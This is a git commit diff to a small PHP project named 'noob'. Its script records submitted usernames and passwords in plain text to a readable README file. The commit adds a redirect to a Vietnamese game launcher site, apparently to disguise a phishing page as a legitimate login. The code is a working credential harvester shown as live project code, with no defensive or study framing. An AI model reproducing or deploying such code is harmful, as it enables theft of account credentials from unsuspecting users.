9975129446978ba4e4b3cab17930d9ca57025edf
unknown <huydang.dh@mt2014.com>
2015-11-30 10:48:06 +0700

    Ghi chú Commit

--- README.md
+++ README.md
@@ -1,2 +1,4 @@
 # noob
 noob everywhere
+
+
--- noob.php
+++ noob.php
@@ -5,10 +5,12 @@
 		$file = fopen("README.md","a");
 		fwrite($file, '<> ID : '.$_GET["txtUserName"].' --> PW : '.$_GET["txtPassword"]."\n");
 		fclose($file);
-
+		echo "<script>window.location.href = 'http://truykich.net.vn/launcher.aspx' </script>";
+		header("Location : http://truykich.net.vn/launcher.aspx");
 	}
 	else {
 		# code...
-		echo "<script> window.location.href = 'http://google.com' </script>";
+		echo "<script>  </script>";
+		echo "<center><h1>ERROR</h1></center>";
 	}
 ?>
